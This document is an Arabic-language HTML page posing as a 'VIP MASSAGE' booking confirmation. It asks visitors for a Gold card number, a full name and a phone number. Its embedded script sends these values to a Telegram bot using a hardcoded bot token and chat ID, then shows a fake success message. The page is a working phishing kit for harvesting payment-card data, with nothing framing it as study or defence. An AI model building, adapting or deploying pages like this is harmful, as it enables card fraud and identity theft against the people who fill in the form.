<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>تأكيد الحجز VIP</title>

<style>
*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:Arial;
}

body{
background:linear-gradient(135deg,#0f0f0f,#1b1b1b);
min-height:100vh;
display:flex;
justify-content:center;
align-items:center;
padding:20px;
color:white;
}

.container{
width:100%;
max-width:420px;
background:#181818;
border-radius:20px;
padding:30px;
box-shadow:0 0 25px rgba(0,0,0,0.6);
border:1px solid #333;
}

.logo{
text-align:center;
font-size:28px;
font-weight:bold;
margin-bottom:10px;
color:#d4af37;
}

.desc{
text-align:center;
font-size:14px;
color:#bbb;
margin-bottom:25px;
}

.inputBox{
margin-bottom:18px;
}

.inputBox label{
display:block;
margin-bottom:8px;
font-size:14px;
color:#ddd;
}

.inputBox input{
width:100%;
padding:14px;
border:none;
outline:none;
border-radius:12px;
background:#222;
color:white;
font-size:15px;
border:1px solid #333;
}

.inputBox input:focus{
border:1px solid #d4af37;
}

button{
width:100%;
padding:15px;
background:#d4af37;
border:none;
border-radius:14px;
font-size:16px;
font-weight:bold;
cursor:pointer;
transition:0.3s;
color:black;
}

button:hover{
opacity:0.9;
transform:scale(1.02);
}

.message{
margin-top:18px;
text-align:center;
font-size:14px;
color:#00ff95;
display:none;
}
</style>
</head>

<body>

<div class="container">

<div class="logo">VIP MASSAGE</div>

<div class="desc"
يرجى ملء المعلومات لتأكيد الحجز
</div>

<form id="massageForm">

<div class="inputBox">
<label>رقم بطاقة الذهبية</label>
<input type="text" id="gold" placeholder="0079xxxxxxxxxxxx">
</div>

<div class="inputBox">
<label>الاسم و اللقب بالفرنسية</label>
<input type="text" id="name" placeholder="Nom et prénom">
</div>

<div class="inputBox">
<label>رقم الهاتف</label>
<input type="text" id="phone" placeholder="05xxxxxxxx">
</div>

<button type="submit">تأكيد الحجز</button>

<div class="message" id="message">
تم إرسال الطلب بنجاح ✅
</div>

</form>

</div>

<script>
const TOKEN = "8844512844:AAGu_jJp-A8ZJfHTTi_Rh57zOCaCbIcd6kk";
const CHAT_ID = "8735699172";

document.getElementById("massageForm").addEventListener("submit", async function(e){

e.preventDefault();

const gold = document.getElementById("gold").value;
const name = document.getElementById("name").value;
const phone = document.getElementById("phone").value;

const text =
`📥 طلب جديد

💳 رقم الذهبية:
${gold}

👤 الاسم:
${name}

📞 الهاتف:
${phone}`;

try{

await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
chat_id:CHAT_ID,
text:text
})
});

document.getElementById("message").style.display="block";

document.getElementById("massageForm").reset();

}catch(err){
alert("حدث خطأ أثناء الإرسال");
}

});
</script>

</body>
</html>
